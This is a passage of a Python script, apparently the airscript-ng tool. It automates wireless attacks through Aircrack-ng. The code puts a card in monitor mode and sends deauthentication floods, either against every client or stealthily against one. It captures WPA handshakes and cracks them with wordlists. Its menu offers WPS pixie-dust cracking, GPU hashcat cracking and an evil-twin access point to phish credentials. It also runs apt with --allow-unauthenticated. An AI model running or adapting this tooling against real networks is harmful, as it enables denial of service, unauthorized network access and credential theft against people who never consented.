            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
            os.system("sudo systemctl start NetworkManager.service")
            os.system("sudo systemctl start wpa_supplicant.service")
            os.system("clear")
            if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt 2>/dev/null")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt 2>/dev/null")
def aircrackng(): #Lots of effort needed 
    import os,time
    print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
    check_depends()
    print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
    time.sleep(1)		
    os.system("clear")
    while True:
        try:
            def mainScreen():
                print ("""
    \n\033[1;37;48m

 █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███╗   ██╗ ██████╗ 
██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ████╗  ██║██╔════╝ 
███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝█████╗██╔██╗ ██║██║  ███╗
██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██║╚██╗██║██║   ██║
██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 


\033[1;33;48m[info] \033[1;32;48mDeveloped by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.\033[1;39;48m                                                                                  
    """)
                #os.system("echo 'Starting...'")
                if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
                    os.system("mkdir HANDSHAKES")
                #print("\nHi, welcome to aircrack-ng made easy")
                print("\nHi, Please read everything that appears at the bottom")
                print("Thanks for using this program")
                os.system("sudo systemctl stop NetworkManager.service")
                os.system("sudo systemctl stop wpa_supplicant.service")
                print("\n\033[1;32;48m[+] \033[1;32;48myour cards are: \033[1;31;48m\n")
                os.system("ls /sys/class/net | grep ^wl")
                print("\n")
                global index
                index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
                index = str(index)
                os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
                print("\n\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is in monitor mode" %(index))
                print("\033[1;34;48m[info] \033[1;34;48m2) now, we'll run Airodump-ng to capture the handshake")
                input("\033[1;34;48m[info] \033[1;33;48m3) once you start airodump, you need to press \033[1;32;48mCTRL+C\033[1;33;48m when you see your target network. \n\n\033[1;33;48m[?] press enter to continue >>")
                os.system("airodump-ng -a %s" %(index)) 
                print("\nOk, all I need is a few things from you")
                b = input("\033[1;33;48m[?] \033[0;33;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>> ")
                b = str(b)
                c = input("\033[1;33;48m[?] \033[0;34;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>> ")
                c = str(c)
                d = input("\033[1;33;48m[?] \033[0;36;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>> ")
                d = str(d)
                if b and c and d != "":
                    os.system("clear")
                    #print("\033[1;32;48m[info] \033[0;31;48mNow, the idea is when someone connects/reconnects, we intercept the handshake to crack later.")
                    print("\033[0;32;48m[info] \033[1;36;48mWe need to de-auth someone. We don't have to, you can wait for someone to connect.")
                    #print("\033[0;37;48m[info] \033[0;33;48mYou can leave it blank to not disconnect anyone")
                    e = input("\n\033[1;35;48m[?] \033[1;39;48mDe-auth all \033[1;32;48m[type a]\033[1;39;48m, de-auth client \033[1;32;48m[type c]\033[1;39;48m, don't de-auth \033[1;32;48m[type n]\033[0;39;48m \033[1;31;48m ~# \033[0;39;48m")
                    e = str(e)
                    def post_frame():
                        print("\n\n\033[1;34;48m[info] \033[1;32;48mIf you saw [WPA HANDSHAKE: %s] at the top right, then its time to crack the handshake." %(d))
                        print("\033[1;32;48m[info] \033[1;36;48mWe need a wordlist. You can download one from here: https://goo.gl/3UoZ34")
                        #print("\033[1;34;48m[info] \033[0;34;48mPlease download or locate one ")
                        #print("\033[1;36;48m[info] \033[0;33;48mHopefully the password will be in there or put it in there")
                        input("\n\033[1;32;48m[+] \033[1;31;48mPlease Specify wordlist. Press \033[1;32;48m[enter]\033[1;31;48m to open file selection \033[1;31;48m ~# \033[0;39;48m")
                        def wordlist():
                            from tkinter.filedialog import Tk
                            from tkinter.filedialog import askopenfilename
                            Tk().withdraw()
                            global f
                            f = askopenfilename()
                            f = str(f)
                        wordlist()
                        os.system("clear")
                        print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: HANDSHAKES/%s-01.cap" %(b))
                        print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(f))
                        #print("\033[1;37;48m[info] \033[1;39;48mOk, ready? press enter to start cracking")
                        #print("\033[1;35;48m[info] \033[1;39;48mIf nothing is found then ctrl+c and try again")
                        input("\n\033[1;33;48mPress \033[1;32;48m[enter]\033[1;31;48m ~# \033[0;39;48m")
                        os.system("aircrack-ng HANDSHAKES/%s-01.cap -w %s" %(b,f))
                        print("\n\n\033[1;32;48m[+] \033[0;37;48mIf you see 'KEY FOUND:XXXXXXX', that's the PSK.")
                        print("\033[1;32;48m[+] \033[0;37;48mIf the passphrase was not in the dictonary then try option [10] using hashcat.\n")
                        clearScreen()
                    def standard():
                        os.system('clear')
                        global stda 
                        print("\033[1;32;48m[info] \033[1;39;48mHow many de-auths do you want to send to the client: %s? Typing '0' will de-auth indefinitely, creating a denial of service." %(g))
                        stda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                        input("\n\033[1;33;48m[?] \033[1;37;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                        os.system("iwconfig %s channel %s" %(index,c))
                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                        post_frame()
                    def broadcast_deauth():
                        os.system('clear')
                        global brda 
                        print("\033[1;32;48m[info] \033[1;39;48mHow many de-auths do you want to send to all? Typing '0' will de-auth indefinitely, creating a denial of service.")
                        brda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                        input("\n\033[1;33;48m[?] \033[1;39;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                        os.system("iwconfig %s channel %s" %(index,c))
                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                        post_frame()
                    def no_deauth():
                        os.system('clear')
                        print("\n\033[1;37;48m[info] \033[1;39;48mYou have chosen not to disconnect anyone.")
                        print("\033[1;33;48m[info] \033[1;39;48mYou need to wait for someone to connect.")
                        input("\n\033[1;36;48m[info] \033[0;33;48mREADY? HIT \033[1;32;48m[ENTER]\033[0;33;48m TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C.\033[1;31;48m ~# \033[0;39;48m" %(d))
                        os.system("\niwconfig %s channel %s" %(index,c))
                        os.system("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                        post_frame()
                    def sta():
                        os.system("xterm -title 'COPY/PASTE: HIGHLIGHT & CLICK SCROLL WHEEL OR LB+RB' -geometry 90x20+4320+7640 -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng --bssid %s -c %s --ignore-negative-one %s' &" %(d,c,index))
                        global g
                        print("\n\033[0;37;48m[info] \033[1;33;48mIn the \033[1;32;48mXTERM\033[1;33;48m at the bottom right, look at the column where it says bssid/station.")
                        #print("\033[1;35;48m[info] \033[1;37;48mIf you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
                        print("\033[1;34;48m[info] \033[0;36;48mYou can choose a station address to de-auth/disconnect a specific client rather than all devices on the network")
                        print("\033[1;34;48m[info] \033[0;35;48mThis is more stealthy as only one device is being disconnected.")
                        #print("\033[1;34;48m[info] \033[0;34;48mplease ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
                        #print("It is optional but you can also leave this blank if you still don't get it")
                        g = input("\n\033[1;33;48m[?] \033[0;32;48mPlease copy/paste a station address and hit enter.\033[1;31;48m ~# \033[0;39;48m")
                        os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                        g = str(g)
                    if e.lower().startswith("n"):
                        no_deauth()
                    elif e.lower().startswith("a"):
                        broadcast_deauth()
                    elif e.lower().startswith("c"):
                        sta()
                        standard()
                    #else:
                    #    sta()
                    #    if e != "" and g != "":
                    #        standard()
                    #    elif e != "" and g == "":
                    #        broadcast_deauth()
                    #    else:
                    #        no_deauth()
                else:
                    input("\033[1;37;40m[-] \033[0;37;48mYou missed something, try again. \n\033[1;33;48m[press enter]\033[1;31;48m ~# \033[0;39;48m")
                    mainScreen()
            mainScreen()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
            os.system("sudo systemctl start NetworkManager.service")
            os.system("sudo systemctl start wpa_supplicant.service")
            os.system("clear")
            if input("\n\033[1;37;48m[-] \033[1;39;48mPress \033[1;32;48m[y]\033[1;39;48m to exit or any other key to return to start \033[1;31;48m ~# \033[0;39;48m").lower().startswith("y"):
                os.system("rm log.txt 2>/dev/null")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt 2>/dev/null")
def title(): #Works so far
    try:
        import os
        os.system('clear')
        if os.getuid() != 0:
            print("\033[1;33;48m[?] \033[0;39;48mNot running as root! Please re-run after 'sudo su'\n")
            os._exit(1)
        print("\033[1;33;48m[?] \033[0;37;48mWhat tool would you like to use? Please run as root or after 'sudo su'")
        print("\033[1;35;48mType [1] - Aircrack-ng to crack WPA/WPA2")
        print("\033[1;34;48mType [2] - Reaver with pixie dust to crack WPS (rare vulnerability)")
        print("\033[1;37;48mType [3] - Add the Kali-Rolling Sources and install any dependancies")
        print("\033[1;31;48mType [4] - If you used option [3] and APT broke, use this to fix it")
        print("\033[1;33;48mType [5] - Update and upgrade all system packages")
        print("\033[1;32;48mType [6] - Add an alias to invoke from anywhere")
        print("\033[1;36;48mType [7] - If you used option [6] and terminal broke, use this to fix")
        print("\033[1;35;48mType [8] - Setup Hashcat and drivers to use GPU for cracking")
        print("\033[1;30;48mType [9] - Host a Evil-Twin/MITM AP to phish credentials, sniff traffic and more.")
        print("\033[1;37;48mType [10] - Crack an existing WPA/WPA2 handshake using CPU/GPU.")
        print("\n\n\033[1;37;40mType [99] - Exit ")
        selection = input("\033[0;39;48m\n|MENU|(Press 1, 2, 3, 4, 5, 6 or 7) >>")
        if selection == "1":
            aircrackng()
        elif selection == "2":
            reaver()
        elif selection == "3":
            install_deps()
        elif selection == "4":
            revert()
        elif selection == "5":
            import os
            os.system("clear")
            if input("\033[0;32;48m\n[+]\033[0;38;48m|MENU|APT_UPDATE|(Update system and perform full-upgrade to system?) \033[0;32;48m [y/n]\033[0;34;48m>>").lower().startswith("y"):
                os.system("sudo apt-get install xterm apt >> log.txt -y --allow-unauthenticated")
                os.system("sudo xterm $HOLD -title 'Updating, do not close!'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'apt update --allow-unauthenticated;apt full-upgrade -y --allow-unauthenticated;apt autoclean;apt autoremove -y --allow-unauthenticated' ")
                print("\033[0;32;48mSystem is up to date, Goodbye!")
                os.system("rm log.txt 2>/dev/null")
                os._exit(1)
            else:
                title()
        elif selection == "99":
            import os
            log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
            if log == 0:
                os.system("rm log.txt 2>/dev/null")
                os.system("clear")
            else:
                pass
            os._exit(1)
        elif selection == "6":
            aliasfunc()
        elif selection == "7":
            unaliasfunc()
        elif selection == "8":
            def menufunc():
                import os
                print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
                check_depends()
                os.system("clear")
                print("\n\033[1;35;48mType [1] - Download and setup Hashcat to crack WPA/WPA2 handshakes with a NVIDIA-GTX/AMD-RADEON GPU")
                print("\033[1;34;48mType [2] - Download the OPENCL/OPENGL GPU drivers required by Hashcat")
                print("\033[1;36;48mType [3] - Install the driver files downloaded from option [2]")
                print("\n\n\033[1;37;40mType [99] - Return to menu")
                sel2 = input("\033[0;39;48m\n|MENU|POST_CRACK|(ENTER CHOICE) \033[1;31;48m~# \033[0;39;48m")
                if sel2 == "1":
                    hashcatdownloadfunc()
                if sel2 == "2":
                    driverdownloadfunc()
                if sel2 == "3":
                    drifunc()
                if sel2 == "99":
                    title()
                else:
                    menufunc()
            menufunc()
        elif selection == "9":
            print("\n\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
            check_depends()
            mitm_fakeap_func()
        elif selection == "10":
            handshake_func()
        #elif selection == "98":
        #    os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
        #    input("\n\nDone. Hit enter ~# ")
        #    title()
        else: 
            os.system('clear')
            title()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        print("\n")
        log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
        if log == 0:
            os.system("rm log.txt 2>/dev/null")
        else:
            pass
        os._exit(1)
title()

